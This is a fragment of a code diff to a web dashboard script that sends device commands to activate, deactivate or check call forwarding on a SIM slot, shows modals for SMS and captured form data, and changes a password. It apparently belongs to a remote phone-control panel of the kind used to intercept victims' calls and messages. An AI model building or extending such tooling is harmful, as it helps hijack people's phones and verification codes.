-                const simSlot = document.getElementById('_cfSim').value;
-                document.getElementById('_cfStatus').innerText='Checking...';
-                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_STATUS', data:{ simSlot } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? ('Status: '+(d.message||'OK')) : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
-            };
+            const num = prompt("Enter Forward Number (or leave blank to deactivate):");
+            const action = num ? 'CALL_FORWARD_ACTIVATE' : 'CALL_FORWARD_DEACTIVATE';
+            fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action, data:{ number:num, simSlot:1 } }) }).then(r=>r.json()).then(d=>toast(d.message));
         }
-        function closeModal(modalId) { 
-            document.getElementById(modalId).classList.remove('show'); 
-            // clear open modal tracking when closed
-            if (currentOpenModal && ((modalId === 'viewSmsModal' && currentOpenModal.type === 'sms') || (modalId === 'viewDataModal' && (currentOpenModal.type === 'data' || currentOpenModal.type === 'form')))) {
-                currentOpenModal = null;
-            }
-        }
-        window.onclick = function(event) { const viewDataModal = document.getElementById('viewDataModal'); const viewSmsModal = document.getElementById('viewSmsModal'); if (event.target == viewDataModal) viewDataModal.classList.remove('show'); if (event.target == viewSmsModal) viewSmsModal.classList.remove('show'); }
 
-        // initial
-        document.addEventListener('DOMContentLoaded', () => { /* no-op */ });
+        function closeModal(id) { document.getElementById(id).classList.remove('show'); currentOpenModal = null; }
+        async function changePass() { const o = prompt('Old Password:'); const n = prompt('New Password:'); if (o && n) { const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword: o, newPassword: n }) }); const d = await r.json(); toast(d.success ? 'Changed' : 'Wrong Old', !d.success); } }
     </script>
 </body>
 </html>
